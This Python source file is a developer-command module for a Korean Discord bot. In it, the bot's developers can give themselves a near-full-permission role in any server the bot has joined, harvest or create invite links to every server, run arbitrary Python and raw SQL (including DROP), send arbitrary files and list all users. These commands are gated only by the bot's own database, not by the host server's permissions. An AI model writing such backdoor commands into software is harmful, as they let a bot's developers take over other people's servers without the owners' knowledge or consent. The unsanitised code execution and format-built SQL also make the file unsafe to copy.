import discord
from discord.ext import commands
import sqlite3
from lib import settings
import asyncio
import ast

owners = settings.Owners
def insert_returns(body):
	if isinstance(body[-1], ast.Expr):
		body[-1] = ast.Return(body[-1].value)
		ast.fix_missing_locations(body[-1])

	if isinstance(body[-1], ast.If):
		insert_returns(body[-1].body)
		insert_returns(body[-1].orelse)

	if isinstance(body[-1], ast.With):
		insert_returns(body[-1].body)

class Develop(commands.Cog):
	def __init__(self, bot):
		self.bot = bot

	@commands.command(name="업로드")
	async def upload(self, ctx, *args):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Developer" or ctx.author.id in owners:
			if not args:
				await ctx.send("<:cs_no:659355468816187405> {} - 공백은 업로드 할 수 없어요.".format(ctx.author.mention))
			else:
				try:
					await ctx.send("<:cs_yes:659355468715786262> {0} - 이 파일이 맞나요? `{1}`".format(ctx.author.mention, args[0]), file=discord.File(args[0]))
				except FileNotFoundError:
					await ctx.send("<:cs_no:659355468816187405> {} -  그런 파일은 봇 폴더 내에 존재하지 않아요.".format(ctx.author.mention))
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 관리자` 권한이 있어야 해요.".format(ctx.author.mention))
	
	@commands.command(name="아키우스")
	async def getAdmin(self, ctx):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Developer" or ctx.author.id in owners:
			Arceus = await ctx.guild.create_role(name="아키우스", permissions=discord.Permissions(permissions=2147483135), color=discord.Color(0xF4EB94), hoist=True, mentionable=True, reason="아키우스 디버깅")
			await ctx.author.add_roles(Arceus)
			await ctx.message.add_reaction("<:cs_yes:659355468715786262>")
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))

	@commands.command(name="루트")
	async def evaluate(self, ctx, *, cmd):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Developer" or ctx.author.id in owners:
			fn_name = "_eval_expr"
			cmd = cmd.strip("` ")
			cmd = "\n".join(f"    {i}" for i in cmd.splitlines())
			body = f"async def {fn_name}():\n{cmd}"
			parsed = ast.parse(body)
			body = parsed.body[0].body
			insert_returns(body)

			env = {
				'bot': ctx.bot,
				'discord': discord,
				'commands': commands,
				'ctx': ctx,
				'__import__': __import__
			}
			exec(compile(parsed, filename="<ast>", mode="exec"), env)

			result = (await eval(f"{fn_name}()", env))
			if result is not None:
				await ctx.send("명령어 실행이 완료되었어요! 실행된 후에 출력된 값 :\n```{}```".format(result))
			else:
				await ctx.send("명령어 실행이 완료되었어요! 실행된 후에 출력된 값 :\n```출력된 값이 없습니다.```")
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))

	@commands.command(name="주작")
	async def dbcom(self, ctx, *args):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Developer" or ctx.author.id in owners:
			await ctx.message.delete()
			conn = sqlite3.connect("lib/data.db")
			cur = conn.cursor()
			if args[0] == "SELECT":
				cur.execute(ctx.message.content[4:])
				rows = cur.fetchall()
				for row in rows:
					await ctx.send(row)
				conn.close()
				await ctx.send("<:cs_yes:659355468715786262> {0} - SQL 명령을 실행 완료했어요.\n보낸 SQL 명령 : `{1}`".format(ctx.author.mention, ctx.message.content[4:]))
			else:
				if args[0] == "DROP" or args[0] == "UPDATE" or args[0] == "DELETE" or args[0] == "INSERT" or args[0] == "CREATE":
					cur.execute(ctx.message.content[4:])
					conn.commit()
					conn.close()
					await ctx.send("<:cs_yes:659355468715786262> {0} - SQL 명령을 실행 완료했어요.\n보낸 SQL 명령 : `{1}`".format(ctx.author.mention, ctx.message.content[4:]))
				else:
					await ctx.send("<:cs_console:659355468786958356> {} - 그 명령어는 사용하실 수 없어요.".format(ctx.author.mention))
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))

	@commands.command(name="유저목록")
	async def user_count(self, ctx):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Developer" or ctx.author.id in owners:
			async with ctx.channel.typing():
				await asyncio.sleep(3)
				pin = await ctx.send("현재 집계된 계정은 **{}**개에요.".format(len(self.bot.users)))
				await pin.pin()
				for u in self.bot.users:
					if u.bot != True:
						await ctx.send("{0.name}#{0.discriminator} ({0.id})".format(u))
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))

	@commands.command(name="중요공지")
	async def devan(self, ctx, *args):
		embed = discord.Embed(title="중요 :: {}".format(ctx.message.content.split(";")[1]), description="{}\n \n**봇과 관련된 문의는 LLOOOOTT#2260 혹은 [이 서버](https://discord.gg/HrG4ntB)에서 해주세요!**".format(ctx.message.content.split(";")[2]), color=0xF4EB94)
		embed.set_author(name="알림", icon_url=self.bot.user.avatar_url)
		embed.set_thumbnail(url=self.bot.user.avatar_url)
		embed.set_footer(text="배포자 : {0.name}#{0.discriminator}".format(ctx.author))
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Owner" or ctx.author.id in owners:
			sex = await ctx.send("<:cs_console:659355468786958356> {} - 정말로 이렇게 전송하시겠어요?".format(ctx.author.mention), embed=embed)
			await sex.add_reaction("<:cs_yes:659355468715786262>")
			def check(reaction, user):
				return user == ctx.author and reaction.message.id == sex.id and str(reaction.emoji) == "<:cs_yes:659355468715786262>"
			
			try:
				reaction, user = await self.bot.wait_for('reaction_add', timeout=100, check=check)
			except asyncio.TimeoutError:
				await sex.delete()
			else:
				cur.execute("SELECT * FROM announce")
				rows = cur.fetchall()
				error = 0
				no = 0
				sent = 0
				no_perms = 0
				invalid_channel = 0
				for row in rows:
					channel = self.bot.get_channel(row[2])
					if channel is not None:
						try:
							await channel.send(embed=embed)
							sent += 1
							no += 1
						except discord.Forbidden:
							no_perms += 1
							no += 1
						except discord.HTTPException:
							error += 1
							no += 1
						except:
							error += 1
							no += 1
					else:
						cur.execute("UPDATE announce SET enabled = 'false' WHERE guild = {0}".format(row[0]))
						conn.commit()
						invalid_channel += 1
				erem = discord.Embed(description="공지 전송 시도 : `{4}`회\n전송됨 : `{0}`개의 서버\n권한 없음 : `{1}`개의 서버\n잘못된 채널 : {5}\n오류 발생 : `{2}`개의 서버\n전송되지 않은 서버 : `{3}`개의 서버".format(sent, no_perms, error, len(self.bot.guilds) - sent, no, invalid_channel), color=0xF4EB94)
				await ctx.send(ctx.author.mention, embed=erem)
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))
	
	@commands.command(name="서버레거시")
	async def serverlist_legacy(self, ctx):
		conn = sqlite3.connect("lib/data.db")
		cur = conn.cursor()
		cur.execute("SELECT * FROM users WHERE user = {}".format(ctx.author.id))
		rows = cur.fetchall()
		if rows[0][1] == "Owner" or ctx.author.id in owners:
			await ctx.send("현재 길드 개수는 {}개에요. 길드 목록 :".format(len(self.bot.guilds)))
			i = 1
			async with ctx.channel.typing():
				for guild in self.bot.guilds:
					try:
						ginvites = await guild.invites()
						if not ginvites:
							try:
								ginvite = await guild.text_channels[0].create_invite(reason="아키우스 디버깅")
								await ctx.send("#{0} - **{1.name}** ({1.id}, `{1.member_count}`명) Invite :: {2}".format(i, guild, ginvite.url))
							except:
								await ctx.send("#{0} - **{1.name}** ({1.id}, `{1.member_count}`명) Invite :: `초대 링크를 불러올 수 없었어요.`".format(i, guild))
						else:
							await ctx.send("#{0} - **{1.name}** ({1.id}, `{1.member_count}`명) Invite :: {2}".format(i, guild, ginvites[0].url))
					except:
						try:
							ginvite = await guild.text_channels[0].create_invite(reason="아키우스 디버깅")
							await ctx.send("#{0} - **{1.name}** ({1.id}, `{1.member_count}`명) Invite :: {2}".format(i, guild, ginvite.url))
						except:
							await ctx.send("#{0} - **{1.name}** ({1.id}, `{1.member_count}`명) Invite :: `초대 링크를 불러올 수 없었어요.`".format(i, guild))
					i += 1
		else:
			await ctx.send("<:cs_no:659355468816187405> {} - 권한이 없어요. 이 명령어를 사용하려면 `봇 개발자` 권한이 있어야 해요.".format(ctx.author.mention))

	@evaluate.error
	async def evalerror(self, ctx, error):
		await ctx.send("입력한 구문을 실행하고 있는데 오류가 발생했어요.\n`{}`".format(error))

def setup(bot):
	bot.add_cog(Develop(bot)) 